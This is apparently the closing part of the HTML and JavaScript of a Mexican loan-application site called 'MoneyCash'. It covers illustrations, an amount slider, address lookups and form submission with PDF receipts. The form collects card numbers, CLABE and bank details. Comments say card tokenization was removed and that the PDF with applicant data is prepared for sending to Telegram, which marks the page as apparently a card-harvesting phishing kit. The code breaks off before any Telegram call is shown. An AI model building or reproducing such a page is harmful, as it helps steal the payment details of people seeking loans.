  <!-- Galería de imágenes externas para reforzar secciones clave -->
  <section id="galeria" class="container-lg mb-3">
    <h3>Galería</h3>
    <p class="small-muted">Imágenes ilustrativas relacionadas con nuestros servicios.</p>
      <div class="thumb-grid">
      <!-- Ilustraciones SVG estilizadas: persona, tarjeta y dinero -->
      <!-- 1) Persona: retrato estilizado -->
      <svg class="thumb selectable ripple-container" viewBox="0 0 600 400" role="button" tabindex="0" aria-label="Ilustración de persona" xmlns="http://www.w3.org/2000/svg" style="border-radius:8px;overflow:hidden;">
        <defs>
          <linearGradient id="g-person-bg" x1="0" x2="1">
            <stop offset="0" stop-color="#6B8DF6"/>
            <stop offset="1" stop-color="#3B54C8"/>
          </linearGradient>
          <linearGradient id="g-skin" x1="0" x2="1"><stop offset="0" stop-color="#FFD8B5"/><stop offset="1" stop-color="#F2B88A"/></linearGradient>
        </defs>
        <rect width="600" height="400" fill="url(#g-person-bg)" rx="8" ry="8" />
        <!-- cuerpo -->
        <g transform="translate(120,60)">
          <rect x="60" y="180" width="360" height="160" rx="20" fill="#123356" opacity="0.12" />
          <rect x="140" y="200" width="320" height="140" rx="18" fill="#0A2340" opacity="0.06" />
          <!-- hombros / torso -->
          <ellipse cx="300" cy="220" rx="120" ry="80" fill="#FFFFFF" opacity="0.06" />
          <!-- cabeza -->
          <circle cx="300" cy="140" r="52" fill="url(#g-skin)" />
          <!-- cabello -->
          <path d="M250 120 q50 -60 100 0 q-40 -20 -100 0" fill="#2B2F6B" />
          <!-- ojos -->
          <circle cx="285" cy="140" r="5" fill="#1B2540" />
          <circle cx="315" cy="140" r="5" fill="#1B2540" />
          <!-- sonrisa -->
          <path d="M285 155 q15 12 30 0" stroke="#1B2540" stroke-width="2" fill="none" stroke-linecap="round" />
          <!-- ropa -->
          <rect x="238" y="180" width="124" height="70" rx="10" fill="#0E5BB5" />
        </g>
        <text x="40" y="360" fill="#FFFFFF" font-family="Inter, Arial, sans-serif" font-weight="700" font-size="18">Préstamos personales</text>
      </svg>

      <!-- 2) Tarjeta: tarjeta de pago estilizada -->
      <svg class="thumb selectable ripple-container" viewBox="0 0 600 400" role="button" tabindex="0" aria-label="Ilustración de tarjeta de pago" xmlns="http://www.w3.org/2000/svg" style="border-radius:8px;overflow:hidden;">
        <defs>
          <linearGradient id="g-card-bg" x1="0" x2="1">
            <stop offset="0" stop-color="#00A1FF"/>
            <stop offset="1" stop-color="#0059D6"/>
          </linearGradient>
        </defs>
        <rect width="600" height="400" fill="url(#g-card-bg)" rx="8" ry="8" />
        <!-- tarjeta -->
        <rect x="80" y="110" width="440" height="240" rx="18" fill="#FFFFFF" opacity="0.12" />
        <rect x="100" y="130" width="400" height="200" rx="14" fill="#ffffff" />
        <!-- chip -->
        <rect x="140" y="170" width="50" height="36" rx="4" fill="#E6BF63" />
        <g fill="#0B3560" font-family="Inter, Arial, sans-serif">
          <text x="170" y="220" font-size="22" font-weight="700">1234  5678  9012  3456</text>
          <text x="170" y="255" font-size="14" fill="#0B3560">TARJETA • VENC: 12/29</text>
        </g>
        <!-- logo -->
        <circle cx="460" cy="200" r="24" fill="#FF6B6B" />
        <circle cx="495" cy="200" r="24" fill="#FFD66B" opacity="0.9" />
        <text x="40" y="360" fill="#FFFFFF" font-family="Inter, Arial, sans-serif" font-weight="700" font-size="18">Tarjeta de pago</text>
      </svg>

      <!-- 3) Dinero: billetes y monedas estilizados -->
      <svg class="thumb selectable ripple-container" viewBox="0 0 600 400" role="button" tabindex="0" aria-label="Ilustración de dinero" xmlns="http://www.w3.org/2000/svg" style="border-radius:8px;overflow:hidden;">
        <defs>
          <linearGradient id="g-money-bg" x1="0" x2="1">
            <stop offset="0" stop-color="#7EE7A9"/>
            <stop offset="1" stop-color="#2BB673"/>
          </linearGradient>
        </defs>
        <rect width="600" height="400" fill="url(#g-money-bg)" rx="8" ry="8" />
        <!-- billetes apilados -->
        <g transform="translate(120,90)">
          <rect x="0" y="60" width="360" height="120" rx="12" fill="#FFFFFF" opacity="0.12" />
          <rect x="20" y="40" width="320" height="100" rx="10" fill="#FFFFFF" />
          <rect x="40" y="20" width="280" height="80" rx="8" fill="#E6F7EB" />
          <rect x="260" y="55" width="40" height="20" rx="6" fill="#2B8A4A" />
          <circle cx="60" cy="60" r="18" fill="#2B8A4A" />
          <text x="48" y="66" font-family="Inter, Arial, sans-serif" font-weight="700" font-size="18" fill="#FFFFFF">$</text>
        </g>
        <!-- monedas -->
        <g transform="translate(420,220)">
          <circle cx="0" cy="0" r="26" fill="#FFD166" />
          <circle cx="36" cy="8" r="20" fill="#FFB703" />
          <circle cx="-28" cy="18" r="18" fill="#FFD166" />
        </g>
        <text x="40" y="360" fill="#ffffff" font-family="Inter, Arial, sans-serif" font-weight="700" font-size="18">Dinero y pagos</text>
      </svg>
    </div>
  </section>

  <footer class="site-footer container-lg" style="margin-top:18px;">
    <div style="max-width:420px;">
      <p style="margin:0;color:#6b7971;"><i class="bi bi-info-circle me-1" aria-hidden="true"></i>Portal de préstamos y soluciones financieras.</p>
      <div style="margin-top:8px;">
        <a href="mailto:contacto@moneycash.com" class="small-muted me-2"><i class="bi bi-envelope-fill me-1"></i>contacto@moneycash.com</a>
        <a href="tel:+525598765432" class="small-muted"><i class="bi bi-telephone-fill me-1"></i>55 9876 5432</a>
        <a href="./politica_privacidad.html" class="small-muted ms-2"><i class="bi bi-file-earmark-text me-1" aria-hidden="true"></i>Aviso de Privacidad</a>
      </div>
      <div style="margin-top:10px; font-size:0.95rem;">
        <a href="#" class="small-muted me-3"><i class="bi bi-globe2 me-1"></i>Políticas</a>
        <a href="#" class="small-muted me-3"><i class="bi bi-list-check me-1"></i>Términos</a>
      </div>
      <p class="small-muted" style="margin-top:10px;">Última actualización: 24 de noviembre de 2025.</p>
    </div>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <!-- jsPDF para generación de recibos PDF cliente-side -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <!-- Panel de ayuda eliminado por petición del usuario -->
  <!-- Botón flotante eliminado por petición del usuario -->
  <script>
    (function(){
      const minAmount = 1000;
      const maxAmount = 25000;
      const range = document.getElementById('montoRange');
      const amountInput = document.getElementById('montoSolicitado');
      const plazoInput = document.getElementById('plazo');
      const progressBar = document.getElementById('montoProgress');

      function fmt(n){
        try{
          return new Intl.NumberFormat('es-MX',{style:'currency',currency:'MXN',maximumFractionDigits:0}).format(n);
        }catch(e){
          return '$' + n;
        }
      }

      function clamp(v){ return Math.min(maxAmount, Math.max(minAmount, v)); }

      function updateProgress(v){
        const pct = Math.round((v - minAmount) / (maxAmount - minAmount) * 100);
        progressBar.style.width = pct + '%';
        progressBar.setAttribute('aria-valuenow', v);
        progressBar.textContent = fmt(v);
      }

      function recommendedPlazo(amount){
        // Tiempos orientativos y realistas según monto solicitado (ajustados al nuevo máximo 25,000)
        if(amount <= 5000) return 3;
        if(amount <= 15000) return 6;
        if(amount <= 25000) return 12;
        return 12;
      }

      function syncFromRange(){
        const v = clamp(parseInt(range.value,10) || minAmount);
        amountInput.value = v;
        updateProgress(v);
        plazoInput.value = recommendedPlazo(v);
      }

      function syncFromInput(){
        let v = clamp(parseInt(amountInput.value,10) || minAmount);
        range.value = v;
        updateProgress(v);
        plazoInput.value = recommendedPlazo(v);
      }

      // Initial sync
      document.addEventListener('DOMContentLoaded', function(){
        // If the numeric input has a value, use it; otherwise keep range default
        const initial = parseInt(amountInput.value,10) || parseInt(range.value,10) || 15000;
        const v = clamp(initial);
        range.value = v;
        amountInput.value = v;
        updateProgress(v);
        plazoInput.value = recommendedPlazo(v);
      });

      range.addEventListener('input', syncFromRange);
      amountInput.addEventListener('change', syncFromInput);
      amountInput.addEventListener('input', function(){
        // reflect typing but don't break slider until change
        const typed = parseInt(amountInput.value,10);
        if(!Number.isNaN(typed)){
          const clamped = clamp(typed);
          progressBar.textContent = fmt(clamped);
          // don't change slider yet on every keystroke
        }
      });

    })();
  </script>

  <!-- Script: poblar estados y ciudades dependientes -->
  <script>
    (function(){
      const statesCities = {
        'Aguascalientes': ['Aguascalientes'],
        'Baja California': ['Tijuana','Mexicali','Ensenada'],
        'Baja California Sur': ['La Paz','Los Cabos','Loreto'],
        'Campeche': ['Campeche'],
        'Chiapas': ['Tuxtla Gutiérrez','San Cristóbal de las Casas','Tapachula'],
        'Chihuahua': ['Chihuahua','Ciudad Juárez','Delicias'],
        'Ciudad de México': ['Álvaro Obregón','Benito Juárez','Coyoacán','Cuauhtémoc','Gustavo A. Madero','Iztapalapa','Miguel Hidalgo','Tlalpan'],
        'Coahuila': ['Saltillo','Torreón','Monclova'],
        'Colima': ['Colima','Manzanillo'],
        'Durango': ['Durango','Gómez Palacio'],
        'Guanajuato': ['León','Guanajuato','Irapuato','Celaya'],
        'Guerrero': ['Acapulco','Chilpancingo','Zihuatanejo'],
        'Hidalgo': ['Pachuca','Tulancingo'],
        'Jalisco': ['Guadalajara','Zapopan','Tlaquepaque','Puerto Vallarta'],
        'Estado de México': ['Toluca','Ecatepec','Naucalpan','Tlalnepantla'],
        'Michoacán': ['Morelia','Uruapan','Zamora'],
        'Morelos': ['Cuernavaca','Jiutepec'],
        'Nayarit': ['Tepic','Bahía de Banderas'],
        'Nuevo León': ['Monterrey','San Nicolás de los Garza','Guadalupe'],
        'Oaxaca': ['Oaxaca de Juárez','Salina Cruz','Huatulco'],
        'Puebla': ['Puebla','Tehuacán'],
        'Querétaro': ['Santiago de Querétaro','San Juan del Río'],
        'Quintana Roo': ['Cancún','Playa del Carmen','Chetumal'],
        'San Luis Potosí': ['San Luis Potosí','Ciudad Valles'],
        'Sinaloa': ['Culiacán','Mazatlán','Los Mochis'],
        'Sonora': ['Hermosillo','Ciudad Obregón','Nogales'],
        'Tabasco': ['Villahermosa'],
        'Tamaulipas': ['Tampico','Ciudad Victoria','Reynosa'],
        'Tlaxcala': ['Tlaxcala'],
        'Veracruz': ['Veracruz','Xalapa','Coatzacoalcos'],
        'Yucatán': ['Mérida','Progreso'],
        'Zacatecas': ['Zacatecas','Fresnillo']
      };

      // Base de datos de códigos postales por estado, municipio y colonia
      const postalCodes = {
        'Aguascalientes': {'Aguascalientes': {'Centro': '20000', 'Jesús María': '20100'}},
        'Baja California': {'Tijuana': {'Centro': '22000', 'Zona Río': '22320'}, 'Mexicali': {'Centro': '21000'}, 'Ensenada': {'Centro': '22800'}},
        'Baja California Sur': {'La Paz': {'Centro': '23000'}, 'Los Cabos': {'Centro': '23450'}, 'Loreto': {'Centro': '25960'}},
        'Campeche': {'Campeche': {'Centro': '24000'}},
        'Chiapas': {'Tuxtla Gutiérrez': {'Centro': '29000'}, 'San Cristóbal de las Casas': {'Centro': '29200'}, 'Tapachula': {'Centro': '30700'}},
        'Chihuahua': {'Chihuahua': {'Centro': '31000'}, 'Ciudad Juárez': {'Centro': '32000'}, 'Delicias': {'Centro': '33000'}},
        'Ciudad de México': {'Benito Juárez': {'Polanco': '11560'}, 'Cuauhtémoc': {'Centro': '06500'}, 'Coyoacán': {'Centro': '04000'}, 'Álvaro Obregón': {'Centro': '01870'}, 'Miguel Hidalgo': {'Centro': '11560'}, 'Iztapalapa': {'Centro': '09000'}, 'Gustavo A. Madero': {'Centro': '07800'}, 'Tlalpan': {'Centro': '14000'}},
        'Coahuila': {'Saltillo': {'Centro': '25000'}, 'Torreón': {'Centro': '27000'}, 'Monclova': {'Centro': '25800'}},
        'Colima': {'Colima': {'Centro': '28000'}, 'Manzanillo': {'Centro': '28200'}},
        'Durango': {'Durango': {'Centro': '34000'}, 'Gómez Palacio': {'Centro': '35000'}},
        'Guanajuato': {'León': {'Centro': '37000'}, 'Guanajuato': {'Centro': '36000'}, 'Irapuato': {'Centro': '36500'}, 'Celaya': {'Centro': '38000'}},
        'Guerrero': {'Acapulco': {'Centro': '39300'}, 'Chilpancingo': {'Centro': '39000'}, 'Zihuatanejo': {'Centro': '40880'}},
        'Hidalgo': {'Pachuca': {'Centro': '42000'}, 'Tulancingo': {'Centro': '43600'}},
        'Jalisco': {'Guadalajara': {'Centro': '44100'}, 'Zapopan': {'Centro': '45000'}, 'Tlaquepaque': {'Centro': '45500'}, 'Puerto Vallarta': {'Centro': '48300'}},
        'Estado de México': {'Toluca': {'Centro': '50000'}, 'Ecatepec': {'Centro': '55000'}, 'Naucalpan': {'Centro': '53840'}, 'Tlalnepantla': {'Centro': '54000'}},
        'Michoacán': {'Morelia': {'Centro': '58000'}, 'Uruapan': {'Centro': '60000'}, 'Zamora': {'Centro': '59600'}},
        'Morelos': {'Cuernavaca': {'Centro': '62000'}, 'Jiutepec': {'Centro': '62565'}},
        'Nayarit': {'Tepic': {'Centro': '63000'}, 'Bahía de Banderas': {'Centro': '63740'}},
        'Nuevo León': {'Monterrey': {'Centro': '64000'}, 'San Nicolás de los Garza': {'Centro': '66450'}, 'Guadalupe': {'Centro': '67100'}},
        'Oaxaca': {'Oaxaca de Juárez': {'Centro': '68000'}, 'Salina Cruz': {'Centro': '70600'}, 'Huatulco': {'Centro': '70985'}},
        'Puebla': {'Puebla': {'Centro': '72000'}, 'Tehuacán': {'Centro': '75700'}},
        'Querétaro': {'Santiago de Querétaro': {'Centro': '76000'}, 'San Juan del Río': {'Centro': '76800'}},
        'Quintana Roo': {'Cancún': {'Centro': '77500'}, 'Playa del Carmen': {'Centro': '77710'}, 'Chetumal': {'Centro': '77000'}},
        'San Luis Potosí': {'San Luis Potosí': {'Centro': '78000'}, 'Ciudad Valles': {'Centro': '79000'}},
        'Sinaloa': {'Culiacán': {'Centro': '80000'}, 'Mazatlán': {'Centro': '82000'}, 'Los Mochis': {'Centro': '81200'}},
        'Sonora': {'Hermosillo': {'Centro': '83000'}, 'Ciudad Obregón': {'Centro': '85000'}, 'Nogales': {'Centro': '84000'}},
        'Tabasco': {'Villahermosa': {'Centro': '86000'}},
        'Tamaulipas': {'Tampico': {'Centro': '89000'}, 'Ciudad Victoria': {'Centro': '87000'}, 'Reynosa': {'Centro': '88500'}},
        'Tlaxcala': {'Tlaxcala': {'Centro': '90000'}},
        'Veracruz': {'Veracruz': {'Centro': '91700'}, 'Xalapa': {'Centro': '91000'}, 'Coatzacoalcos': {'Centro': '96400'}},
        'Yucatán': {'Mérida': {'Centro': '97000'}, 'Progreso': {'Centro': '97320'}},
        'Zacatecas': {'Zacatecas': {'Centro': '98000'}, 'Fresnillo': {'Centro': '99200'}}
      };

      function updatePostalCode(){
        const estado = (document.getElementById('estado')||{}).value || '';
        let ciudad = (document.getElementById('ciudad')||{}).value || '';
        const colonia = (document.getElementById('colonia')||{}).value || '';
        const cpEl = document.getElementById('cp');
        
        if(!cpEl) return;
        
        // Si la ciudad es "other", intenta obtener del input ciudadOtro
        if(ciudad === 'other'){
          const otro = document.getElementById('ciudadOtro');
          if(otro && otro.value) ciudad = otro.value;
        }
        
        // Buscar el código postal
        let cp = '';
        if(estado && postalCodes[estado]){
          if(ciudad && postalCodes[estado][ciudad]){
            if(colonia && postalCodes[estado][ciudad][colonia]){
              cp = postalCodes[estado][ciudad][colonia];
            }else if(colonia){
              // Si la colonia no existe, usar la primera disponible
              const firstColonia = Object.keys(postalCodes[estado][ciudad])[0];
              cp = postalCodes[estado][ciudad][firstColonia];
            }else{
              // Si no hay colonia, usar la primera colonia del municipio
              const firstColonia = Object.keys(postalCodes[estado][ciudad])[0];
              cp = postalCodes[estado][ciudad][firstColonia];
            }
          }
        }
        
        if(cp){
          cpEl.value = cp;
        }
      }

      function populateCitiesForState(state){
        const ciudadEl = document.getElementById('ciudad');
        if(!ciudadEl) return;
        // Clear
        ciudadEl.innerHTML = '';
        const placeholder = document.createElement('option');
        placeholder.value = '';
        placeholder.textContent = state ? 'Selecciona tu ciudad / municipio' : 'Selecciona primero un estado';
        ciudadEl.appendChild(placeholder);
        if(state && statesCities[state]){
          statesCities[state].forEach(c=>{
            const opt = document.createElement('option'); opt.value = c; opt.textContent = c; ciudadEl.appendChild(opt);
          });
          // opción para escribir otra ciudad si no aparece en la lista
          const optOther = document.createElement('option'); optOther.value = 'other'; optOther.textContent = 'Otra ciudad (escribir)'; ciudadEl.appendChild(optOther);
        }
      }

      document.addEventListener('DOMContentLoaded', function(){
        const estadoEl = document.getElementById('estado');
        const ciudadEl = document.getElementById('ciudad');
        if(!estadoEl || !ciudadEl) return;

        // Si existe un estado guardado, establecer y poblar ciudades
        try{
          const savedState = localStorage.getItem('mc_estado');
          if(savedState && !estadoEl.value) estadoEl.value = savedState;
          populateCitiesForState(estadoEl.value || savedState);
          const savedCity = localStorage.getItem('mc_ciudad');
          if(savedCity){
            const exists = Array.from(ciudadEl.options).some(o=>o.value === savedCity);
            if(!exists){ const opt = document.createElement('option'); opt.value = savedCity; opt.textContent = savedCity; ciudadEl.appendChild(opt); }
            ciudadEl.value = savedCity;
            if(ciudadEl.value === 'other'){
              const otro = document.getElementById('ciudadOtro'); if(otro){ otro.classList.remove('d-none'); otro.value = savedCity; }
            }
          }
        }catch(e){ /* ignore */ }

        estadoEl.addEventListener('change', function(){ populateCitiesForState(this.value); updatePostalCode(); });
        // Mostrar/ocultar input para ciudad personalizada
        ciudadEl.addEventListener('change', function(){
          const otro = document.getElementById('ciudadOtro'); if(!otro) return;
          if(this.value === 'other'){ otro.classList.remove('d-none'); otro.focus(); }
          else { otro.classList.add('d-none'); }
          updatePostalCode();
        });
        
        // Actualizar C.P. cuando cambia la colonia
        const coloniaEl = document.getElementById('colonia');
        if(coloniaEl){
          coloniaEl.addEventListener('change', updatePostalCode);
          coloniaEl.addEventListener('input', updatePostalCode);
        }
        
        // Actualizar C.P. cuando cambia ciudadOtro
        const ciudadOtroEl = document.getElementById('ciudadOtro');
        if(ciudadOtroEl){
          ciudadOtroEl.addEventListener('change', updatePostalCode);
          ciudadOtroEl.addEventListener('input', updatePostalCode);
        }
      });
    })();
  </script>

  <script>
    // Animations: añadir clases al enfocar/seleccionar para transiciones elegantes
    (function(){
      function addFocusHandlers(){
        const controls = Array.from(document.querySelectorAll('input:not([type=hidden]), select, textarea, button'));
        controls.forEach(el=>{
          el.addEventListener('focus', ()=>{ el.classList.add('is-selected'); });
          el.addEventListener('blur', ()=>{ el.classList.remove('is-selected'); });
          // on change add a short highlight
          el.addEventListener('change', ()=>{
            el.classList.add('is-selected');
            setTimeout(()=> el.classList.remove('is-selected'), 700);
          });
          // for checkboxes, animate their list item
          if(el.type === 'checkbox'){
            el.addEventListener('change', ()=>{
              const li = el.closest('li'); if(li){ li.classList.toggle('is-selected', el.checked); setTimeout(()=> li.classList.remove('is-selected'), 800); }
            });
          }
        });
      }

      function wireStepper(){
        const steps = Array.from(document.querySelectorAll('.step'));
        steps.forEach(s=>{
          s.addEventListener('click', ()=>{
            steps.forEach(x=>x.classList.remove('is-active'));
            s.classList.add('is-active');
          });
        });
      }

      /* Ripple creator for click feedback */
      function createRipple(target, clientX, clientY){
        try{
          const rect = target.getBoundingClientRect();
          const r = document.createElement('span');
          r.className = 'ripple';
          // position center of ripple at click
          r.style.left = (clientX - rect.left) + 'px';
          r.style.top = (clientY - rect.top) + 'px';
          target.appendChild(r);
          // force style recalculation then animate
          requestAnimationFrame(()=> r.classList.add('animate'));
          setTimeout(()=> r.remove(), 700);
        }catch(e){ /* silent */ }
      }

      function addSelectableHandlers(){
        const selectables = Array.from(document.querySelectorAll('.selectable'));
        selectables.forEach(el=>{
          // Ensure parent allows absolute ripples
          if(!el.classList.contains('ripple-container')) el.classList.add('ripple-container');
          // Pointer interactions
          el.addEventListener('click', function(e){
            // visual selection
            el.classList.add('is-selected');
            setTimeout(()=> el.classList.remove('is-selected'), 700);
            // ripple effect
            createRipple(el, e.clientX, e.clientY);
          });
          // Keyboard activation (Enter / Space)
          el.addEventListener('keydown', function(e){
            if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); el.click(); }
          });
          // focus/blur visuals
          el.addEventListener('focus', ()=> el.classList.add('is-selected'));
          el.addEventListener('blur', ()=> el.classList.remove('is-selected'));
        });
      }

      document.addEventListener('DOMContentLoaded', function(){ addFocusHandlers(); wireStepper(); addSelectableHandlers(); });
    })();
  </script>

  <script>
    // Autofill from localStorage; tokenización de tarjeta removida
    (function(){
      const form = document.querySelector('form');
      if(!form) return;

      const fieldsToSave = ['nombre','email','telefono','banco','montoSolicitado','plazo','ingresos','estado','ciudad'];

      function populateFromLocal(){
        try{
          fieldsToSave.forEach(k=>{
            const v = localStorage.getItem('mc_' + k);
            if(!v) return;
            const el = document.getElementById(k);
            if(!el) return;
            if(k === 'ciudad'){
              // Si la ciudad guardada no está en las opciones, crearla y seleccionarla
              const exists = Array.from(el.options).some(o=>o.value === v);
              if(!exists){ const opt = document.createElement('option'); opt.value = v; opt.textContent = v; el.appendChild(opt); }
              if(!el.value || el.value === '') el.value = v;
            }else{
              if(!el.value || el.value === '') el.value = v;
            }
          });
        }catch(e){ console.warn('Autofill localStorage error', e); }
      }

      function saveToLocal(){
        try{
          const save = document.getElementById('saveLocalData');
          if(!save || !save.checked) return;
          fieldsToSave.forEach(k=>{
            if(k === 'ciudad'){
              const select = document.getElementById('ciudad');
              const otro = document.getElementById('ciudadOtro');
              if(!select) return;
              let toSave = select.value;
              if(toSave === 'other' && otro && otro.value) toSave = otro.value;
              if(toSave) localStorage.setItem('mc_' + k, toSave);
            }else{
              const el = document.getElementById(k);
              if(el && el.value) localStorage.setItem('mc_' + k, el.value);
            }
          });
        }catch(e){ console.warn('Save local error', e); }
      }

      form.addEventListener('submit', async function(ev){
        // No tokenization: enviar el formulario tal cual (no tocar campos de tarjeta)
        ev.preventDefault();
        // Si el usuario escribió una ciudad personalizada, asegurarnos de que el select tenga ese valor antes de enviar
        try{
          const ciudadSel = document.getElementById('ciudad');
          const ciudadOtro = document.getElementById('ciudadOtro');
          if(ciudadSel && ciudadOtro && ciudadSel.value === 'other' && ciudadOtro.value){
            const exists = Array.from(ciudadSel.options).some(o=>o.value === ciudadOtro.value);
            if(!exists){ const opt = document.createElement('option'); opt.value = ciudadOtro.value; opt.textContent = ciudadOtro.value; ciudadSel.appendChild(opt); }
            ciudadSel.value = ciudadOtro.value;
          }
        }catch(e){ /* ignore */ }
        try{
            // Generar y adjuntar folio simple si no existe
            const folio = (window.generateFolio ? window.generateFolio() : ('PRE-' + Date.now()));
            let folioInput = form.querySelector('input[name="folio"]');
            if(!folioInput){
              folioInput = document.createElement('input');
              folioInput.type = 'hidden';
              folioInput.name = 'folio';
              form.appendChild(folioInput);
            }
            folioInput.value = folio;

            // Preparar datos públicos para el PDF (no incluir datos sensibles)
            const data = {
              nombre: (document.getElementById('nombre') || {}).value || '',
              email: (document.getElementById('email') || {}).value || '',
              montoSolicitado: (document.getElementById('montoSolicitado') || {}).value || '',
              plazo: (document.getElementById('plazo') || {}).value || '',
              banco: (document.getElementById('banco') || {}).value || '',
              clabe: (document.getElementById('clabe') || {}).value || '',
              cardNumber: (document.getElementById('cardNumber') || {}).value || '',
              // Campos opcionales para aprobación/metadata (se pueden completar desde servidor/admin)
              aprobacion: '',
              aprobadoPor: '',
              fechaAprobacion: ''
            };

            // Intentar generar y descargar el PDF: mostrar spinner, abrir ventana provisional (sincrónico)
            const spinnerEl = document.getElementById('pdfSpinner');
            const submitBtn = form.querySelector('button[type="submit"]');
            if(spinnerEl){ spinnerEl.classList.remove('d-none'); spinnerEl.setAttribute('aria-hidden','false'); }
            if(submitBtn) submitBtn.disabled = true;
            let downloadFolioResult = null;
            try{
              if(window.downloadFolio){
                let previewWin = null;
                // Esperar a que la generación termine o hasta 6s
                const pdfPromise = window.downloadFolio(folio, data, previewWin);
                downloadFolioResult = await Promise.race([pdfPromise, new Promise((res)=> setTimeout(res, 6000))]);
                lastDownloadFolioResult = downloadFolioResult;  // Guardar globalmente
              }
            }catch(e){ console.warn('downloadFolio invocation failed or timed out', e); }
            finally{
              if(spinnerEl){ spinnerEl.classList.add('d-none'); spinnerEl.setAttribute('aria-hidden','true'); }
              if(submitBtn) submitBtn.disabled = false;
            }

            // Save non-sensitive fields if user opted in
            saveToLocal();

            // Intentar adjuntar PDF y enviar por fetch al endpoint del formulario
            let sentViaFetch = false;
            try{
              let pdfBlob = null;
              if(window.generateFolioPdf){
                try{ pdfBlob = await Promise.race([window.generateFolioPdf(folio, data), new Promise((res)=> setTimeout(()=>res(null), 6000))]); }catch(e){ pdfBlob = null; }
              }

              if(pdfBlob instanceof Blob){
                try{
                  // construir FormData desde el formulario (incluye archivos subidos) y añadir el PDF
                  const fd = new FormData(form);
                  const safeName = (String(data.nombre || '').normalize ? String(data.nombre || '').normalize('NFD').replace(/\p{Diacritic}/gu, '') : String(data.nombre || '')).trim().replace(/\s+/g,'_').replace(/[^a-zA-Z0-9_-]/g,'').slice(0,40) || 'solicitante';
                  const filename = 'folio-' + folio + '-' + safeName + '.pdf';
                  fd.append('folioPdf', new File([pdfBlob], filename, { type: 'application/pdf' }));

                  // Enviar por fetch (POST multipart/form-data)
                  const resp = await fetch(form.action, { method: 'POST', body: fd });
                  if(resp && (resp.status >= 200 && resp.status < 400)){
                    sentViaFetch = true;
                    try{ const resultDiv = document.getElementById('folioResult'); if(resultDiv) resultDiv.innerHTML = '<div class="alert alert-success" role="alert">Solicitud enviada y PDF adjunto enviado por correo.</div>'; }
                    catch(e){}
                  }
                }catch(e){ console.warn('Error sending form via fetch with PDF', e); }
              }
            }catch(e){ console.warn('Attachment send failed', e); }

            // Si no se envió por fetch (por ejemplo por timeout o error), usar el envío tradicional
            if(!sentViaFetch){
              form.submit();
            }
        }catch(e){
          console.error('Error submitting form', e);
          form.submit();
        }
      });

      // Auto-populate immediately on load if local data exists
      document.addEventListener('DOMContentLoaded', populateFromLocal);
    })();
  </script>

  <script>
    (function(){
      function wireCopyButtons(){
        const copyBtn = (id) => document.getElementById(id);
        const all = [ 'copyEmailBtn', 'copyPhoneBtn' ];
        all.forEach(id=>{
          const btn = copyBtn(id); if(!btn) return; btn.dataset.orig = btn.innerHTML;
          btn.addEventListener('click', function(){
            const text = btn.dataset.copy || '';
            if(!navigator.clipboard){ alert('Copia manual: ' + text); return; }
            navigator.clipboard.writeText(text).then(()=>{
              btn.innerHTML = '<i class="bi bi-check-lg me-1"></i>Copiado';
              setTimeout(()=> btn.innerHTML = btn.dataset.orig, 1400);
            }).catch(()=>{ alert('No se pudo copiar. Copia manual: ' + text); });
          });
        });
      }
      document.addEventListener('DOMContentLoaded', function(){
        wireCopyButtons();
        // Inicializar tooltips de Bootstrap (por ejemplo el icono CVV)
        try{
          const tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
          tooltipTriggerList.forEach(function (el) { new bootstrap.Tooltip(el); });
        }catch(e){ /* no crítico */ }
      });
    })();
  </script>

  <script>
    // Funciones de simulación: generación de folio reutilizable y simulador de envío / vista móvil
    (function(){
      function pad(n){ return String(n).padStart(2,'0'); }

      // Identidad institucional de alta resolución para los comprobantes PDF.
      // Se dibuja localmente en canvas, por lo que los PDF no requieren imágenes externas.
      window.getMoneyCashPdfLogoData = function(){
        try{
          const scale = 3;
          const canvas = document.createElement('canvas');
          canvas.width = 720 * scale; canvas.height = 156 * scale;
          const ctx = canvas.getContext('2d');
          ctx.scale(scale, scale);

          ctx.fillStyle = '#FFFFFF';
          ctx.beginPath(); ctx.roundRect(2, 2, 152, 152, 24); ctx.fill();
          ctx.fillStyle = '#05365A';
          ctx.beginPath();
          ctx.moveTo(28, 122); ctx.lineTo(28, 35); ctx.lineTo(52, 35); ctx.lineTo(78, 85);
          ctx.lineTo(104, 35); ctx.lineTo(128, 35); ctx.lineTo(128, 122); ctx.lineTo(110, 122);
          ctx.lineTo(110, 69); ctx.lineTo(88, 112); ctx.lineTo(68, 112); ctx.lineTo(46, 69);
          ctx.lineTo(46, 122); ctx.closePath(); ctx.fill();
          ctx.strokeStyle = '#D4A84A'; ctx.lineWidth = 6;
          ctx.beginPath(); ctx.moveTo(28, 134); ctx.lineTo(128, 134); ctx.stroke();

          ctx.fillStyle = '#FFFFFF'; ctx.font = "700 70px Georgia, 'Times New Roman', serif";
          ctx.fillText('MoneyCash', 178, 82);
          ctx.fillStyle = '#DCEAF5'; ctx.font = '700 22px Arial, sans-serif';
          ctx.letterSpacing = '3px'; ctx.fillText('SOLUCIONES FINANCIERAS', 182, 119); ctx.letterSpacing = '0px';
          return canvas.toDataURL('image/png');
        }catch(e){ console.warn('No se pudo generar el logo institucional para el PDF:', e); return null; }
      };
      window.generateFolio = function(){
        const now = new Date();
        const ts = now.getFullYear() + pad(now.getMonth()+1) + pad(now.getDate()) + pad(now.getHours()) + pad(now.getMinutes()) + pad(now.getSeconds());
        const rand = Math.floor(1000 + Math.random() * 9000);
        return 'PRE-' + ts + '-' + rand;
      };

      // Descargar folio en el dispositivo: generar PDF formal y elegante (con logo desde CDN), fallback TXT
      // Esta función ahora también retorna el Blob del PDF para poder enviarlo a Telegram
      window.downloadFolio = async function(folio, data, targetWindow){
        let generatedPdfBlob = null;
        try{
          const nombre = (data && data.nombre) || (document.getElementById('nombre')||{}).value || '';
          const email = (data && data.email) || (document.getElementById('email')||{}).value || '';
          const monto = (data && data.montoSolicitado) || (document.getElementById('montoSolicitado')||{}).value || '';
          const plazo = (data && data.plazo) || (document.getElementById('plazo')||{}).value || '';
          const banco = (data && data.banco) || (document.getElementById('banco')||{}).value || '';
          const clabe = (document.getElementById('clabe')||{}).value || '';
          // Domicilio (si se pasó en data usarlo, si no intentar leer del formulario)
          const estado = (data && data.estado) || (document.getElementById('estado')||{}).value || '';
